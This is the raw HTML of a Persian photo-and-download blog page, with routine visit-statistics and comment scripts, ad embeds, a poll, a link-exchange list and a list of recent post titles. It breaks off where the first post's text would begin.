
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script>
	linkdailyForm = function(){
		try{
			window.open('/linkdaily/new','linkdaily','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=500px,height=460px');
		} catch(e){}
	}
</script><script>

	statInfo = new Array();
	setStatVar = function(index,value){
		statInfo[index] = value;
	}
	getStatVar = function(index){
		if(statInfo[index]) document.write(statInfo[index]);
	}
	
	setStatVar('total_post','1996');
	setStatVar('total_author','2');
	setStatVar('modify_date','جمعه 23 شهریور 1386');
	
	setStatVar('today_view','73');
	setStatVar('yesterday_view','238');
	
	setStatVar('this_month_view','11055');
	setStatVar('last_month_view','7394');

	setStatVar('total_view','1212214');
	setStatVar('last_view_date','یکشنبه 1 آبان 1390 (07:12)');
	

</script><script>
	messageForm = function(post_id){
		try{
			window.open('/message','message','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=550px');
		} catch(e){}
	}
</script><script>

var MihanblogShopAdsArray = new Array();

function GetMihanBlogShowAds(){
	if(MihanblogShopAdsArray.length){
		var adsTarget = 'MihanblogShopAds';
		var containerWidth = document.getElementById(adsTarget).offsetWidth;
		if(containerWidth>=200){
			var adsCnt = parseInt(containerWidth / 200) ;
			if(adsCnt>MihanblogShopAdsArray.length){
				adsCnt = MihanblogShopAdsArray.length ; 
			}
//			var OneAdsWidth = parseInt(containerWidth / adsCnt) ;
			var OneAdsWidth = containerWidth / adsCnt ;
			if(OneAdsWidth>400){
				OneAdsWidth = 400 ;
			}
			var OutHtml = '';
			var img = '';
			var link = '';
			var title = '';
			var description = '';
			var imgWidth = 70;
			if(OneAdsWidth>230){
				imgWidth = 80;
			}
			if(OneAdsWidth>300){
				imgWidth = 90;
			}
			for(adsOne=0;adsOne<adsCnt;adsOne++){
				
				img = MihanblogShopAdsArray[adsOne]['img'];
				link = MihanblogShopAdsArray[adsOne]['link'];
				title = MihanblogShopAdsArray[adsOne]['title'];
				description = MihanblogShopAdsArray[adsOne]['description'];
				
				OutHtml += '<td style="background-color:#FFF;width: '+OneAdsWidth+'px;border:1px solid #f00;margin:0px 0px;font-size:11px;font-family:tahoma;padding:2px;margin:0px 0px;font-size:11px;border: 1px solid BurlyWood; padding: 1px; height: '+(imgWidth+25)+'px;">';

				OutHtml += '	<a href="'+link+'" target="_blank" style="text-decoration:none">';

				OutHtml += '			<div style="width: '+(OneAdsWidth-16)+'px;cursor:pointer;font-size:12px;padding: 4px 1px 4px 7px; white-space: nowrap; text-align: center; font-weight: bold; color: blue;white-space:nowrap;overflow:hidden">';
				OutHtml += 					title;
				OutHtml += '			</div>';
				OutHtml += '			<div style="cursor:pointer;padding: 1px; display: block; float: right; width: '+imgWidth+'px;">';
				OutHtml += '				<img src="'+img+'" style="border:0px;padding:0px;margin:0px;width:'+imgWidth+'px;height:'+imgWidth+'px;">';
				OutHtml += '			</div>';
				OutHtml += '			<div style="padding: 1px; display: block; float: right; width: '+(OneAdsWidth-13-imgWidth)+'px; text-align: right;overflow:hidden">';
				OutHtml += '				<div style="overflow:hidden;cursor:pointer;padding: 2px 3px; line-height: 17px; height: '+(imgWidth-3)+'px; text-align: justify;color:#000;direction:rtl">';
				OutHtml += 						description;
				OutHtml += '				</div>';
				OutHtml += '			</div>';

				OutHtml += '	</a>';

				OutHtml += '</td>';
			}
			
			var Out = '<table align="center" cellpadding="0" cellspacing="2" style="width:'+(OneAdsWidth*adsCnt)+'px;"><tr>'+OutHtml+'</tr></table>'; 
			
			Out = '<div style="text-align:center;padding:0px;margin:3px auto;">'+Out+'</div>'; 
			
			document.getElementById(adsTarget).style.height = (imgWidth+35)+'px' ;
			document.getElementById(adsTarget).innerHTML = Out ;
		}
	}
}
</script><script>
	try{
		var commentCnt = new Array();
		commentCnt[2119]='0';commentCnt[2120]='2';commentCnt[2121]='8';commentCnt[2122]='0';commentCnt[2123]='12';	} catch(e){}
	
	newComment = function(post_id){
		try{
			window.open('/post/comment/'+post_id,'comment','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=540px');
		} catch(e){}
	}
	setCommentCnt = function(post_id){
		try{
			if(commentCnt[post_id]){
				document.write(commentCnt[post_id]);
			} else {
				document.write(0);
			}
		} catch(e){}
	}
</script>
		<div style="position:absolute;left:0px;top:0px;width:122;z-index:9999;background:#FFF;;border:1px solid #888;cursor:pointer"  id="mihan_page_advert">
			<div style="direction:rtl;text-align:right;padding-right:5px;line-height:18px;font-size:11px;color:#555" onclick="document.getElementById('mihan_page_advert').style.display='none'">
				<img src="http://www.mihanblog.com/public//public/images/publish/advert_close.gif"  /> تبلیغات			</div>
			<div style="width:120px;height:240px">
			<iframe frameborder="0" width="120px" height="240px" src="http://www.iranwebads.com/showads.php?posid=42" scrolling="No"></iframe>			</div>
		</div>

		<script>
	setTodayDate = function(){
		document.write('یکشنبه 1 آبان 1390');
		/*98455*/	}
</script>	<div align="center">
<embed type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" src=" http://hacker.parsaspace.com/flash/tabligh.swf " swLiveConnect="true" width="800" height="200">


<HTML><HEAD><title>
بزرگترین سایت عكس و دانلود</title>
<META http-equiv=Content-Type content="text/html; charset=utf-8">
<STYLE type=text/css>BODY {
	SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #e1ecf7; SCROLLBAR-BASE-COLOR: #8cb6e7; scrollbar-dark-shadow-color: #ffffff
}
</STYLE>

<STYLE>A {
	COLOR: #496c9f; FONT-FAMILY: Tahoma, times new roman, sans-serif; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff00ff; FONT-FAMILY: Tahoma, times new roman, sans-serif
}
A.postedby {
	FONT-SIZE: 7pt; COLOR: #333333; TEXT-DECORATION: none
}
.blogtitle {
	FONT-WEIGHT: bold; FONT-SIZE: 36px; FILTER: glow(Color=#000000,Strength=2); MARGIN: 2px; WIDTH: 450px; COLOR: #ff0000; FONT-FAMILY: Arial, times new roman, sans-serif; HEIGHT: 50px
}
.links {
	FONT-SIZE: 8pt; COLOR: #496c9f; LINE-HEIGHT: 170%; TEXT-DECORATION: none
}
.date {
	FONT-WEIGHT: bold; FONT-SIZE: 10pt; COLOR: #ff9c00; FONT-FAMILY: Tahoma, times new roman, sans-serif
}
.posts {
	FONT-SIZE: 8pt; COLOR: #000000; LINE-HEIGHT: 170%; FONT-FAMILY: Tahoma, times new roman, sans-serif
}
.SearchBox {
	BORDER-RIGHT: #4d4dff 1px solid; BORDER-TOP: #4d4dff 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #4d4dff 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4dff 1px solid; FONT-STYLE: normal; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #bbd3f0; FONT-VARIANT: normal
}
.SearchBTN {
	BORDER-RIGHT: #4d4dff 1px solid; BORDER-TOP: #4d4dff 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #4d4dff 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4dff 1px solid; FONT-STYLE: normal; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #bbd3f0; FONT-VARIANT: normal
}
.mailinput {
	BORDER-RIGHT: #4d4dff 1px solid; BORDER-TOP: #4d4dff 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #4d4dff 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4dff 1px solid; FONT-STYLE: normal; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #bbd3f0; FONT-VARIANT: normal
}
.PoolButton {
	BORDER-RIGHT: #4d4dff 1px solid; BORDER-TOP: #4d4dff 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #4d4dff 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4dff 1px solid; FONT-STYLE: normal; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #bbd3f0; FONT-VARIANT: normal
}
.mailbtn {
	BORDER-RIGHT: #4d4dff 1px solid; BORDER-TOP: #4d4dff 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #4d4dff 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4dff 1px solid; FONT-STYLE: normal; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #bbd3f0; FONT-VARIANT: normal
}
.tb1 {
	BORDER-RIGHT: #8cb6e7 1px solid; BORDER-TOP: #8cb6e7 1px solid; MARGIN: 0px; FONT: 11px/150% Tahoma; BORDER-LEFT: #8cb6e7 1px solid; COLOR: #000066; BORDER-BOTTOM: #8cb6e7 1px solid; TEXT-DECORATION: none
}
.tbl {
	BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-COLLAPSE: collapse; BORDER-RIGHT-WIDTH: 0px
}
P {
	MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; COLOR: #000000; FONT-FAMILY: Tahoma
}
.bannerbox {
	BORDER-RIGHT: #cc0000 1px solid; BORDER-TOP: #cc0000 1px solid; FONT-SIZE: 8pt; MARGIN: 5px 0px 4px; BORDER-LEFT: #cc0000 1px solid; WIDTH: 100px; COLOR: #c0c0c0; BORDER-BOTTOM: #cc0000 1px solid; FONT-FAMILY: Tahoma; HEIGHT: 18px; BACKGROUND-COLOR: #000
}
.btn {
	border:1px solid #cc0000; FONT-SIZE: 8pt; BACKGROUND: url('../../Mojtaba%20Ebrahimi/Desktop/bg-title.gif'); COLOR: #c0c0c0; FONT-FAMILY: Tahoma; TEXT-ALIGN: center
}
</STYLE>

<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY style="BACKGROUND-IMAGE: url(none)" bgColor=#e1ecf7 leftMargin=0 
background="" topMargin=0 marginwidth="0" marginheight="0"><BR>
<TABLE height=1176 cellSpacing=0 cellPadding=0 width=920 align=center 
  border=0><TBODY>
  <TR vAlign=top bgColor=#ffffff>
    <TD 
    style="BORDER-RIGHT: #8cb6e7 1px solid; BORDER-TOP: #8cb6e7 1px solid; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #8cb6e7; BORDER-LEFT: #8cb6e7 1px solid" 
    background="http://www.dlisland.persiangig.com/Theme/Ice/link_fill.gif" height=100 ? >
      <TABLE style="BORDER-COLLAPSE: collapse" borderColor=#8cb6e7 cellSpacing=0 
      cellPadding=0 width="100%" border=1 bgcolor="#8CB6E7">
        <TBODY>
        <TR>
          <TD width="25%" 
          background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg">
            <P align=center>&nbsp;</P></TD></TR></TBODY></TABLE>
      <P align=center>
		<IMG height=100 
      src="http://www.dlisland.persiangig.com/Theme/Ice/bannerheader.PNG" width=412 
      align=right border=0>
      <P align=center>&nbsp;</P><FONT color=#8cb6e7 size=7><B><SPAN lang=fa>
      <TABLE class=Tbl height=49 cellSpacing=0 cellPadding=0 width="53%" 
      align=right border=1>
        <TBODY>
        <TR>
          <TD class=Tb1 width="100%" bgColor=#e1ecf7 height=47 align="center">
            <p align="center"><font color="#FF0000" style="font-size: 8pt">
			بســـــــــــــــــم الله الرحمن الرحیم</font></p>
			<p align="center"><font color="#000080">
			<span style="font-size: 8pt">فردی كه در زمان غیب قائم (عج) بر ولایت 
			استوار بماندخداوند اجر هزار شهید بدر اسلام را به او عطا خواهد كرد</span></font></p>
			<p align="center"><FONT color=#8cb6e7 size=7><B>
			<SPAN lang=fa style="font-size: 9pt">
      		<img height="15" src="http://i10.tinypic.com/2lkwcxy.gif" width="27" border="0"></SPAN></B></FONT><span style="FONT-SIZE: 9pt">
			</span><span lang="en-us" style="font-size: 9pt">
			<font color="#ffffff">&nbsp;</font></span><span style="FONT-SIZE: 9pt">ت<font color="#000080">مامی 
			مطالب این سایت مطابق با قوانی</font>ن <font color="#FF0000">جمهوری 
			اسلامی ایران</font> <font color="#000080">می باشد</font><span lang="en-us">&nbsp;</span>&nbsp;<FONT color=#8cb6e7 size=7><B><SPAN lang=fa><img height="15" src="http://i10.tinypic.com/2lkwcxy.gif" width="27" border="0"></SPAN></B></FONT></span></p>
			<P align=center>
            </SPAN><span style="FONT-SIZE: 9pt">&nbsp;</span><SPAN lang=fa></P></TD></TR></TBODY></TABLE>
            </SPAN></B></FONT>
      <P></P>
      <P align=center>&nbsp;</P></TD></TR>
  <TR vAlign=top bgColor=#f5f5f5>
    <TD 
    style="BORDER-TOP-WIDTH: 1px; BORDER-RIGHT: #8cb6e7 1px solid; BORDER-LEFT: #8cb6e7 1px solid; BORDER-TOP-COLOR: #8cb6e7; BORDER-BOTTOM: #8cb6e7 1px solid" 
    background="http://www.dlisland.persiangig.com/Theme/Ice/link_fill.gif" 
      height=1055>
            <TABLE class=Tbl height=21 cellSpacing=0 cellPadding=0 width="100%" 
            border=0>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=21 bgcolor="#8CB6E7">
                  &nbsp;</TD></TR></TBODY></TABLE>
      <TABLE cellSpacing=0 cellPadding=10 width=950 align=center border=0>
        <TBODY>
        <TR>
          <TD dir=rtl vAlign=top width=200 
          background="http://www.dlisland.persiangig.com/Theme/Ice/link_fill.gif" 
          bgColor=#f5f5f5>
            <TABLE class=Tbl height=21 cellSpacing=0 cellPadding=0 width="99%" 
            border=0>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=21 bgcolor="#8CB6E7">
                  <P align=center><B><SPAN lang=fa><FONT color=#333333>دوست 
					گرامی</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <TABLE id=table2 
                  style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
                  height=28 width="100%" border=1>
                    <TBODY>
                    <TR>
                      <TD dir=rtl 
                      style="BORDER-RIGHT: medium none; BORDER-TOP: medium none; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none" 
                      align=middle height=22><FONT style="FONT-SIZE: 12px" 
                        color=#ff0000><B>
                        <SCRIPT language=javascript type=text/javascript>
now = new Date
if (now.getHours() < 3) { document.write("هنوز بیداری ؟!") }
else if (now.getHours() < 11) { document.write("صبح بخیر ...") }
else if (now.getHours() < 15) { document.write("ظهر بخیر ...") }
else if (now.getHours() < 19) { document.write("عصـر بخیر ...") }
else if (now.getHours() < 24) { document.write("شب بخیر ...") }
        </SCRIPT>
                        </B></FONT></TD></TR></TBODY></TABLE>
                  <HR 
                  style="BORDER-RIGHT: 1px dotted; BORDER-TOP: 1px dotted; BORDER-LEFT: 1px dotted; BORDER-BOTTOM: 1px dotted" 
                  width="80%" color=#8cb6e7 SIZE=1>

                  <P align=center><FONT color=#ff0000><B><SPAN lang=fa>پیغام 
					مدیر</SPAN></B></FONT></P>
					<P align=center><b>با سلام</b></P>
					<P align=center>ضمن خوش آمد گویی آرزوی لحظاتی خوش همراه با 
					موفقیت<P align=center>&nbsp;برای شما عزیزان از خداوند متعال&nbsp; 
					<P align=center>خواستار<span lang="fa">م</span>. ‍<P align=center>
					&nbsp;</TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><B><SPAN lang=fa><FONT color=#333333>نظر سنجی</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  
		<form id="frm-13193441264ea397fe8194c" method="post" action="http://www.picdata.mihanblog.com/poll/new/fid/13193441264ea397fe8194c/atrty/1319344126/avrvy/0/key/1e01fbe21308be07084377145570c9af/"  onsubmit="window.open('', 'poll', 'toolbar=0,location=0,status=0,menubar=0,scrollbars=1,resizable=0,width=505,height=315')" target="poll"><input type="hidden" name="data[pollid]" value="12586" id="data[pollid]" />		<b><font color="#FF0000">نظرتون در مورد موضوعات وبلاگ چیه؟</font></b><br />
					<label><input type="radio" name="data[answer]" value="v1">کافی است</label><br><label><input type="radio" name="data[answer]" value="v2">بیشتر کن</label><br><label><input type="radio" name="data[answer]" value="v3">خیلی کم</label><br></p>
					<p align="center">
					<input class="PoolButton" type="submit" value="نتیجه">
		<input type="hidden" name="frm-id" value="13193441264ea397fe8194c" id="frm-id" /></form></TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><SPAN lang=fa><FONT color=#333333><B>مطالب 
					پیشین </B></FONT></SPAN></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1 height="263">
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <P align=right><FONT class=storycontent><font color="#000000">
					+</font> <a target="_blank" href="/post/2123">
					اطلاعیه ه ه ه ه ه </a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2122">
					هک شد</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2121">
					تفکر</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2120">
					........</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2119">
					طبیعت</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2118">
					جالب</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2117">
					کارت پستال</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2116">
					دوباره شعر جالب</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2115">
					ناامیدی</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2114">
					مهربانی</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2113">
					انسانیت</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2112">
					غرور</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2111">
					جواب دعا</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2110">
					زندگی</a><br /><font color="#000000">
					+</font> <a target="_blank" href="/post/2109">
					نقاشی کف خیابان ۳ بعدی ۱</a><br />				</TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><SPAN lang=fa><FONT color=#333333><B>صفحات 
                  </B></FONT></SPAN></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="center"><FONT 
                  color=#000000><a href="/page/1"><b>1</b></a> <a href="/page/2"><span>2</span></a> <a href="/page/3"><span>3</span></a> <a href="/page/4"><span>4</span></a> <a href="/page/5"><span>5</span></a> <a href="/page/6"><span>6</span></a> <a href="/page/7"><span>7</span></a> <a href="/page/8"><i>...</i></a> </FONT></TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><B><SPAN lang=fa><FONT 
                  color=#333333>لینکستان</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl height=25 cellSpacing=0 cellPadding=0 width="99%" 
            border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <span class="Span">
            		<p align="center">
					<span lang="fa"><a href="http://www.ba2.blogfa.com/">
					آتتتتتتنا</a></span><p align="center">
					<span lang="fa"><a href="http://www.mdokhtarak.blogfa.com/">
					دختر تنها</a></span><p align="center">
					<span lang="fa"><a href="http://saki.mihanblog.com/">فقط عكس</a></span><p align="center">
					<span lang="fa"><a href="http://patoghdl.coo.ir/">پاتوق 
					دانلود</a></span><p align="center">
					<span lang="fa"><a href="http://eshghefootball.blogfa.com/">
					عشق فوتبال</a></span><p align="center">
					<span lang="fa">
					<a href="http://www.mersa.mihanblog.com/Cat/20.aspx">هك حرفه 
					ای</a></span><p align="center">
					<span lang="fa"><a href="http://www.spacefire.sub.ir/">
					دانلود بهترینها</a></span><p align="center">
					<span lang="fa"><a href="http://biriaaa.blogsky.com/">وب 
					نوشت سارا</a></span><p align="center">
					<span lang="fa"><a href="http://jigo0ol.mihanblog.com/">
					اینجا دیگه آخرش</a></span><p align="center">
					<span lang="fa"><a href="http://champn.mihanblog.com/">عكس 
					عكس عكس</a></span><p align="center">
					<span lang="fa"><a href="http://picdata.mihanblog.com/">
					دنیای عكس و دانلود</a></span><p align="center">
					<span lang="fa"><a href="http://itmihan.ir/">گالری عكس و 
					كلیپ</a></span><p align="center">
					<span lang="fa"><a href="http://picdata.mihanblog.com/">هرچی 
					بخوای هست</a></span><p align="center">
					<span lang="fa"><a href="http://aoco.mihanblog.com/">
					بزرگترین وبلاگ دانلود</a></span><p align="center">
					<span lang="fa">
					<a href="http://javadhacktools2006.mihanblog.com/">بزرگترین 
					گالری عكس</a></span><p align="center">
					<span lang="fa">
					<a href="http://www.themepack.mihanblog.com/">دانلود بهترین 
					برنامه ها</a></span><p align="center">
					<span lang="fa">
					<a href="http://www.chahchahe.mihanblog.com/">قدرتمند سایت 
					دانلود ایرانیان</a></span><p align="center">
					<span lang="fa">
					<a href="http://www.king-blog.mihanblog.com/">عكس دخترهای 
					سراسر دنیا</a></span><p align="center">
					<span lang="fa"><a href="http://www.biaaa.mihanblog.com/">
					بیااا تو هر چی بخوای هست</a></span><p align="center">
					<span lang="fa"><a href="http://perspolis-7.mihanblog.com/">
					وبلاگ بزرگ باشگاه پرسپلیس</a></span><p align="center">
					<span lang="fa"><a href="http://jeghele.mihanblog.com/">پر 
					مطلب ترین وبلاگ میهن بلاگ</a></span><p align="center">
					<span lang="fa"><a href="http://kav3h.org/">دانلود جدیدترین 
					برنانه های جهان</a></span><p align="center">
					<span lang="fa">
					<a href="http://takavarct.mihanblog.com/Cat/39.aspx">بشكه 
					عكس...گونی جك و اس ام اس</a></span><p align="center">
					<span lang="fa"><a href="http://zoe.blogfa.com/">فقط عكس 
					مطمئنا ارزش دیدنش رو داره</a></span><p align="center">
					<span lang="fa"><a href="http://2tiya.mihanblog.com/">دانلود 
					_ عكس (خنده دار و...)_جك و اس ام اس</a></span><p align="center">
					<span lang="fa">
					<a href="http://www.p30tools.mihanblog.com/">دنبال هرچی عكس 
					و نرم افزار اینجا هستش</a></span></TD></TR>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff height=24>
                  <P align=center><FONT 
                  style="FONT-SIZE: 8pt; FONT-FAMILY: Tahoma, Verdana,Helvetica" 
                  face=Tahoma><SPAN lang=fa>
                  <MARQUEE style="COLOR: #496c9f" scrollDelay=150 
                  direction=right width=174 bgColor=#ffffff>محتوای وبلاگ و سایتهای لینک داده شده هیچ ربطی به سایت ما ندارد و در&nbsp; ظمن هرکس دوست داشت با ما تبادل لینک کند حتما بعد از قرار دادن لینک ما در سایت یا وبلاگ خود به ما خبر دهد</MARQUEE></SPAN></FONT></P></TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><B><SPAN lang=fa><FONT color=#333333>آمار سایت</FONT></SPAN></B></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <P align=right><font color="#000000"><span lang="en-us">&nbsp;</span>امروز :</font> <font color="#FF0000">
					<script>setTodayDate()</script></font><br />
<font color="#000000"><span lang="en-us">&nbsp;</span>بازدید های امروز :</font><font color="#FF0000"> 
					<script>getStatVar('today_view');</script></font><br />
<font color="#000000"><span lang="en-us">&nbsp;</span>بازدید های دیروز :</font> <font color="#FF0000">
					<script>getStatVar('yesterday_view');</script></font><br />
<font color="#000000"><span lang="en-us">&nbsp;</span>كل مطالب :</font><font color="#FF0000"> 
					<script>getStatVar('total_post');</script></font><br />
<font color="#000000"><span lang="en-us">&nbsp;</span>كل نظرها : </font> <font color="#FF0000">
					</font><br />
<font color="#000000"><span lang="en-us">&nbsp;</span>كل بازدید ها : </font> <font color="#FF0000">
					<script>getStatVar('total_view');</script></font></p>
					<P align=center>
					
					<!-- PersianStat -->
<!-- URL: http://www.picdata.mihanblog.com -->
<script language='javascript' type='text/javascript' src='http://www.persianstat.ir/service/stat.js'></script>
<script language='javascript' type='text/javascript'>
persianstat(10038890, 0);
</script>
<!-- /PersianStat -->
</p>
				</TD></TR></TBODY></TABLE>
            <P><BR></P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 align=middle width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7"><B><SPAN lang=fa><FONT 
                  color=#333333>خبرنامه</FONT></SPAN></B></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <P align=center>
</TD></TR></TBODY></TABLE>
            <P align="center">&nbsp;</P>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><span lang="fa"><font color="#333333"><b>سخن 
					روز</b></font></span></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="center"><span lang="fa">گناه مردم را از رزق محروم می 
				كند</span></p>
				<p align="left"><span lang="fa">
				<font size="1" color="#CC0000" face="Arial">
				امام صادق (ع)</font></span></p>
				</TD></TR></TBODY></TABLE>
            <P align="center"><BR></P></TD>
          <TD dir=rtl vAlign=top width=531 
          background="http://www.dlisland.persiangig.com/Theme/Ice/link_fill.gif" 
          bgColor=#f5f5f5>   
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1 height="53">
              <TBODY>
              <TR>
                <TD class=Tb1 width="99%" bgColor=#ffffff>
                  <p align="center"><span lang="fa">این سایت تابع قوانین 
					فیلترینگ<font color="#008000"> جمهوری اسلامی ایران </font>و
					<font color="#008000">موسسه فرهنگی و اطلاع رسانی تبیان</font> 
					می باشد</span><p align="center"><span lang="fa">
					<font color="#008000">بنرهای</font> زیر هیچ گرایشی به این 
					سایت<font color="#008000"> ندارند </font>و ثبت آنها تنها جهت<font color="#008000"> 
					تبلیغ</font> می باشد</span></TD></TR></TBODY></TABLE>
			<p align="center">&nbsp;</p>
            <table border="1" width="95%">
				<tr>
					<td>
					<a href="http://shiraz.pardakht.com/affiliate/setuser.cfm?ID=shiraz30d&AID=javad&Redirect=http://www.shiraz30d.com/product_info.php?products_id=10&osCsid=d8db454e765b5d37e36cd149d734e363">
					<img border="0" src="http://p30javad.persiangig.com/image/تب.gif" width="509" height="60"></a></td>
				</tr>
			</table>
            		<div id="MihanblogShopAds" style="display:block;height:0px;width:100%;border:0px"></div>
		      
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" 
                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                bgColor=#8cb6e7 height=20 ? >
                  &nbsp;<a href="/post/2123" target="_blank" style="font-family: Tahoma; font-size: 11; text-decoration: none; font-weight: 700">اطلاعیه ه ه ه ه ه </a></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
                  <FONT color=#000000>
